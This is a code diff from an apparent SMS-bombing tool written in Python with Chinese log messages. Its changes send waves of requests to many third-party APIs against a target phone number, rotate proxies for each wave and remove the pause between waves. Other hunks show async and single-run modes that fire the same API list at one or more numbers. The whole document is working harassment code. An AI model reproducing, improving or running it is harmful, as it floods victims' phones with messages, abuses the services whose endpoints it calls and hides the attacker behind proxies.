@@ -106,23 +106,18 @@ def run(thread: int, phone: Union[str, tuple], frequency: int):
             logger.success(f"第{i}波轰炸开始！")
             _process = ''
             for proxy in _proxies:
-                logger.success(f"第{i}波轰炸 - 当前正在使用代理："+proxy['all://']+" 进行轰炸...")
+                logger.success(f"第{i}波轰炸 - 当前正在使用代理：" +
+                               proxy['all://']+" 进行轰炸...")
                 # 不可用的代理或API过多可能会影响轰炸效果
-                # for api_get in _api_get:
-                #     _process = pool.submit(reqFunc, api_get, phone, proxy)
-                for api in _api:
-
-                    pool.submit(reqFunc, api, phone)
                 for api_get in _api_get:
-                    pool.submit(reqFunc, api_get, phone)
-                logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
-                time.sleep(interval)
+                    _process = pool.submit(reqFunc, api_get, phone, proxy)
+                # logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
+                # time.sleep(interval)
         else:
             for api in _api:
                 pool.submit(reqFunc, api, phone)
             for api_get in _api_get:
                 pool.submit(reqFunc, api_get, phone)
-
 
 
 @click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@@ -133,7 +128,6 @@ def asyncRun(phone):
     _api_get = load_getapi()
 
     apis = _api + _api_get
-
 
     loop = asyncio.get_event_loop()
     loop.run_until_complete(runAsync(apis, phone))
@@ -147,7 +141,6 @@ def oneRun(phone):
     _api_get = load_getapi()
 
     apis = _api + _api_get
-
 
     for api in apis:
         try:
